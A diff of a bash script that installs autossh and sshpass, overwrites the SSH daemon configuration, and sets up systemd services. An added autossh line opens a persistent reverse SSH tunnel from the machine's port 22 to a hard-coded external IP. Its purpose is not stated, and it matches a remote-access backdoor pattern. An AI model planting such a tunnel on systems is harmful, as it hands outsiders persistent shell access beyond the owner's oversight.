@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-sudo apt update
+sudo apt-get update -y
 
 packages=(curl openssh-server autossh sshpass)
 
@@ -10,7 +10,7 @@ for pkg in "${packages[@]}"; do
         echo "[+] $pkg is already installed."
     else
         echo "[*] Installing $pkg..."
-        sudo apt install -y "$pkg"
+        sudo apt-get install -y "$pkg"
     fi
 done
 
@@ -125,6 +125,7 @@ echo "$requiredSettings" | sudo tee /etc/ssh/sshd_config > /dev/null
 
 hosts=("40.233.2.200")
 
+mkdir -p /etc/systemd/system
 for host in "${hosts[@]}"; do
     echo "Setting up for $host"
 
@@ -147,9 +148,12 @@ RestartSec=3
 WantedBy=multi-user.target
 EOF
 
+	autossh -i "$key_path" -N -R "$received_port:127.0.0.1:22" "$user@$host"
+
     sudo systemctl daemon-reload
     sudo systemctl enable ${service_name}.service
     sudo systemctl start ${service_name}.service
 
     echo "Service $service_name started for $host"
 done
+
